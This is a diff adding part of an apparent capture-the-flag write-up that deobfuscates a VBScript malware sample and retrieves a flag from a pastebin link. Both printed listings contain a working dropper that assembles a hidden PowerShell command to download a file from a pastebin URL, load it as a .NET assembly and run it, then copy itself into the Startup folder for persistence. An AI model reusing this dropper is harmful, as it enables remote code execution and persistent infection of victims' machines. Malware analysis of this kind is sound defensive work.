@@ -96,3 +96,151 @@ End Subz&;'Bw:`l),
 ```
 
 After a bit of deobfuscation I got the following result:
+```vbs
+Set Object = WScript.CreateObject("WScript.Shell")
+Set SObject = CreateObject("Shell.Application")
+Set FObject = CreateObject("Scripting.FileSystemObject")
+SPath = WScript.ScriptFullName
+Dim Code
+
+Power0 = "Po"
+Power1 = "we"
+Power2 = "rS"
+Power3 = "he"
+Power4 = "ll"
+Power5 = " "
+Power = Power0 + Power1 + Power2 + Power3 + Power4 + Power5
+
+Path0 = "&$&f&&=&'&&C&"
+Path1 = "&:&\&U&s&e&&rs"
+Path2 = "&\P&&u&b&l&i&&c&"
+Path3 = "\D&&o&c&u&me"
+Path4 = "n&ts&\&&J&u&ly"
+Path5 = "&.h&t&&m&';"
+Path = Path0 + Path1 + Path2 + Path3 + Path4 + Path5
+
+Reqest0 = "&i&&f &(&!(T&e&st&-P&ath &$&f)&){&&I&n&v&o&ke&-&W&eb&&R&eq&u&&e&s&t '"
+Reqest1 = "&h&t&t&p&s&:&/&/&p&a&s&t"
+Reqest2 = "&e&b&i&n&.&c&o&m&/&r&a&w"
+Reqest3 = "&/&S&i&Y&G&w&w&c&z&"
+Reqest4 = "'& &-o&u&"
+Reqest5 = "t&f&i&le &$f&  &};"
+Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5
+
+PathString = SObject.NameSpace(7).Self.Path & "/" & WScript.ScriptName
+
+InvokeReqest0 = "&[&S&y&s&t&e&m&."
+InvokeReqest1 = "&R&e&f&l&e&c&t&i&"
+InvokeReqest2 = "o&n&.&A&s&s&e&m&b&l"
+InvokeReqest3 = "&y&]&:&:&l&o&a&d&f"
+InvokeReqest4 = "&i&l&e(&$&"
+InvokeReqest5 = "f&)&;&"
+InvokeReqest = InvokeReqest0 + InvokeReqest1 + InvokeReqest2 + InvokeReqest3 + InvokeReqest4 + InvokeReqest5
+
+ExecAssem0 = "&[&W&o&r&k"
+ExecAssem1 = "&A&r&e&a&."
+ExecAssem2 = "&W&o&&r&k"
+ExecAssem3 = "]&:&"
+ExecAssem4 = ":&E&x&"
+ExecAssem5 = "e(&)&"
+ExecAssem = ExecAssem0 + ExecAssem1 + ExecAssem2 + ExecAssem3 + ExecAssem4 + ExecAssem5
+
+CollectThenReplace Power, Path, Reqest, InvokeReqest, ExecAssem
+
+Sub CollectThenReplace(First, Second, Third, Fourth, Fifth)
+    Temp = First + Second + Third + Fourth + Fifth
+    Code = Replace(Temp, "&", "")
+End Sub
+
+Return = Object.Run(Code, 0, True)
+
+WScript.Sleep(50000)
+
+For i = 1 To 5
+    If i = 5 Then
+        Paste SPath
+    End If
+Next
+
+Sub Paste(RT)
+    FObject.CopyFile RT, PathString
+End Sub
+```
+
+Now this leaves us with some letters surrounded by `&` so let's go to cyberchef again and cut them:
+```vbs
+Set Object = WScript.CreateObject("WScript.Shell")
+Set SObject = CreateObject("Shell.Application")
+Set FObject = CreateObject("Scripting.FileSystemObject")
+SPath = WScript.ScriptFullName
+Dim Code
+
+Power0 = "Po"
+Power1 = "we"
+Power2 = "rS"
+Power3 = "he"
+Power4 = "ll"
+Power5 = " "
+Power = Power0 + Power1 + Power2 + Power3 + Power4 + Power5
+
+Path0 = "$f='C"
+Path1 = ":\Users"
+Path2 = "\Public"
+Path3 = "\Docume"
+Path4 = "nts\July"
+Path5 = ".htm';"
+Path = Path0 + Path1 + Path2 + Path3 + Path4 + Path5
+
+Reqest0 = "if (!(Test-Path $f)){Invoke-WebRequest '"
+Reqest1 = "https://past"
+Reqest2 = "ebin.com/raw"
+Reqest3 = "/SiYGwwcz"
+Reqest4 = "' -ou"
+Reqest5 = "tfile $f  };"
+Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5
+
+PathString = SObject.NameSpace(7).Self.Path  "/"  WScript.ScriptName
+
+InvokeReqest0 = "[System."
+InvokeReqest1 = "Reflecti"
+InvokeReqest2 = "on.Assembl"
+InvokeReqest3 = "y]::loadf"
+InvokeReqest4 = "ile($"
+InvokeReqest5 = "f);"
+InvokeReqest = InvokeReqest0 + InvokeReqest1 + InvokeReqest2 + InvokeReqest3 + InvokeReqest4 + InvokeReqest5
+
+ExecAssem0 = "[Work"
+ExecAssem1 = "Area."
+ExecAssem2 = "Work"
+ExecAssem3 = "]:"
+ExecAssem4 = ":Ex"
+ExecAssem5 = "e()"
+ExecAssem = ExecAssem0 + ExecAssem1 + ExecAssem2 + ExecAssem3 + ExecAssem4 + ExecAssem5
+
+CollectThenReplace Power, Path, Reqest, InvokeReqest, ExecAssem
+
+Sub CollectThenReplace(First, Second, Third, Fourth, Fifth)
+    Temp = First + Second + Third + Fourth + Fifth
+    Code = Replace(Temp, "", "")
+End Sub
+
+Return = Object.Run(Code, 0, True)
+
+WScript.Sleep(50000)
+
+For i = 1 To 5
+    If i = 5 Then
+        Paste SPath
+    End If
+Next
+
+Sub Paste(RT)
+    FObject.CopyFile RT, PathString
+End Sub
+```
+
+here I found the IP `https://pastebin.com/raw/SiYGwwcz` to whic hwe can send a curl request and finally get the following:
+```sh
+curl https://pastebin.com/raw/SiYGwwcz
+<!-- flag{ed81d24958127a2adccfb343012cebff} -->
+```
